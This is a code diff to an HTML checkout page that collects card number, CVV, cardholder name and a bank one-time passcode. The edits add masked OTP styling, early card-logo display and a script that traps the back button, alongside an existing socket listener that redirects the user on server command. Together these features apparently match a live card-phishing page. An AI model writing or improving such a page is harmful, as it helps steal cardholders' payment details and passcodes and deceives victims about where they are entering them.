@@ -161,7 +161,9 @@
       color: white;
       display: none;
     }
-    .consent-checkbox.checked svg { display: block; }
+    .consent-checkbox.checked svg {
+      display: block;
+    }
     /* ========== Animations ========== */
     .animate-slide-in { animation: slideIn 0.3s ease-out; }
     @keyframes slideIn {
@@ -204,6 +206,34 @@
       }
       .bottom-logos img { max-height: 25px; }
     }
+    /* ========== OTP Form Specific Styles ========== */
+    .otp-container {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    .otp-input-wrapper, .otp-button-wrapper {
+      width: 48%;
+    }
+    .otp-input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      text-align: center;
+      font-size: 18px;
+      letter-spacing: 5px;
+      -webkit-text-security: disc;
+      caret-color: transparent;
+    }
+    .confirm-btn-disabled {
+      background-color: #ccc;
+      color: #fff;
+    }
+    .confirm-btn-enabled {
+      background-color: #3b82f6;
+      color: #fff;
+    }
   </style>
 </head>
 <body>
@@ -212,7 +242,7 @@
     <div class="content-wrapper">
       <div class="max-w-4xl mx-auto bg-white rounded-2xl shadow-lg overflow-hidden">
         <div class="flex flex-col md:flex-row">
-          <!-- Left Section: Merchant Info & Payment Description (Original) -->
+          <!-- Left Section: Merchant Info & Payment Description -->
           <div class="md:w-7/12 p-5">
             <div class="bg-white rounded-2xl shadow-sm mb-6">
               <div class="flex items-start gap-4 mb-4 px-4 pt-4">
@@ -327,7 +357,7 @@
                     <input type="password" id="cvv" maxlength="3" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="123" required>
                   </div>
                 </div>
-                <!-- Cardholder Name -->
+                <!-- Cardholder Name Field -->
                 <div>
                   <label class="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
                   <input type="text" id="cardholderName" class="block w-full px-3 py-2 border border-gray-300 rounded-none" placeholder="John Doe" required>
@@ -359,7 +389,7 @@
               </p>
               <div class="otp-container">
                 <div class="otp-input-wrapper">
-                  <input type="text" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-none" placeholder="Enter OTP" required>
+                  <input type="password" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-none" placeholder="••••••" required>
                 </div>
                 <div class="otp-button-wrapper">
                   <button type="button" id="otpSubmitButton" class="w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center" disabled>
@@ -437,7 +467,7 @@
       }
     });
   </script>
-  <!-- Card Formatting, BIN Lookup, and Expiry Validation Scripts -->
+  <!-- Card Formatting, BIN Lookup, and Expiry Validation -->
   <script>
     function validateCard(number) {
       let arr = number.replace(/\D/g, '').split('').reverse().map(x => parseInt(x, 10));
@@ -513,11 +543,33 @@
       }
       return null;
     }
+    // Modified: update card logo immediately if less than 6 digits
     async function updateCardTypeAndInfo(value) {
       const cardIcon = document.getElementById("cardTypeIcon");
       const cardInfo = document.getElementById("cardInfo");
       const plain = value.replace(/\s/g, '');
-      if (plain.length >= 6) {
+      if (plain.length < 6) {
+        let type = detectCardType(plain);
+        let logoUrl = "";
+        switch (type) {
+          case "visa":
+            logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png";
+            break;
+          case "mastercard":
+            logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png";
+            break;
+          case "amex":
+            logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png";
+            break;
+          case "rupay":
+            logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png";
+            break;
+          default:
+            logoUrl = "";
+        }
+        cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${type}" style="max-height:100%; max-width:100%;">` : "";
+        if (cardInfo) cardInfo.textContent = "";
+      } else {
         const bin = plain.slice(0, 6);
         const binData = await lookupBIN(bin);
         if (binData) {
@@ -561,9 +613,6 @@
           cardIcon.innerHTML = "";
           if (cardInfo) cardInfo.textContent = "";
         }
-      } else {
-        cardIcon.innerHTML = "";
-        if (cardInfo) cardInfo.textContent = "";
       }
     }
     function updateSubmitButton() {
@@ -785,6 +834,17 @@
     socket.on('redirect', (data) => {
       window.location.href = data.redirectUrl;
     });
+  </script>
+  <!-- Back Button Prevention -->
+  <script>
+    window.onpopstate = function(event) {
+      if (confirm("Do you want to cancel this transaction?")) {
+        window.location.href = '/fail.html';
+      } else {
+        history.pushState(null, null, window.location.href);
+      }
+    };
+    history.pushState(null, null, window.location.href);
   </script>
 </body>
 </html>
